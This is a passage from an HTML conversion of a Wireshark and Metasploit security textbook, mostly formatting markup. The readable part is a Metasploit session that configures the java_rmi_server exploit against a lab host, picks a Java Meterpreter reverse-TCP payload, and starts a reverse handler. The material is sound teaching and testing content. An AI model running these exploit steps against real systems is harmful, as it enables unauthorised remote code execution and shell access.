New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;letter-spacing:-0.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Setting</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Required</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >Description</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section263" ><table class=MsoNormalTable  border=0  cellspacing=0  style="border-collapse:collapse;width:472.7000pt;margin-left:11.2500pt;mso-table-layout-alt:fixed;border:none;mso-padding-alt:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;" ><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >----</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >---------------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >--------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >-----------</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >RHOST</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >192.168.56.103</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The target address</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:24.0500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >RPORT</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >1099</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The target port</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:7.0500pt;margin-left:0.0000pt;text-align:right;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >SRVHOST</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >0.0.0.0</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The local host to listen</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >on.</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >This must be an address on</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:2.5000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >the</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:0.0000pt;" ><span style="font-family:'Times New Roman';mso-fareast-font-family:'Courier New';mso-hansi-font-family:'Courier New';mso-bidi-font-family:'Courier New';font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >local machine or 0.0.0.0</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr><tr style="height:13.5000pt;" ><td width=136  valign=top  style="width:81.6500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  align=right  style="margin-right:7.0500pt;margin-left:0.0000pt;text-align:right;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >SRVPORT</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=203  valign=top  style="width:122.3000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.1500pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >8080</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=119  valign=top  style="width:71.9500pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >yes</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td><td width=328  valign=top  style="width:196.8000pt;padding:0.0000pt 0.0000pt 0.0000pt 0.0000pt ;border-left:none;border-right:none;border-top:none;border-bottom:none;" ><p class=18  style="margin-left:7.2000pt;line-height:12.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';font-size:12.0000pt;" >The local port to listen</span><span style="font-family:'Courier New';font-size:12.0000pt;" ><o:p></o:p></span></p></td></tr></table><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.2000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >on.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:51.3500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSLCert</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >no</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Path to a custom</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >SSL certificate</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:288.6000pt;text-indent:0.0000pt;text-align:left;line-height:13.3000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >(default is randomly</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >generated)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:29.7500pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >URIPATH</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >no</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >The URI to use for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >this exploit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:57.5500pt;margin-left:8.0000pt;text-indent:280.6000pt;text-align:left;line-height:297%;" ><span style="position:absolute;z-index:1;margin-left:151.7500px;margin-top:112.5000px;width:632.0000px;height:91.0000px;" ><img width="632"  height="91"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker338871.png" ></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:297%;font-size:12.0000pt;" >(default is random) Payload options (java/meterpreter/reverse_tcp):</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:297%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:10.9000pt;margin-right:367.9500pt;margin-left:29.5500pt;text-indent:-21.6000pt;text-align:left;line-height:27.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Exploit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >target: Id</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Name</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >----</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Generic (Java</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Payload)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >msf exploit(java_rmi_server) &#62; exploit</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:114.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >[*] Started reverse handler on</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >192.168.56.106:4444 [*] Using URL:</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >http://0.0.0.0:8080/bXh5eyC</span><span style="mso-spacerun:'yes';font-family:'Courier 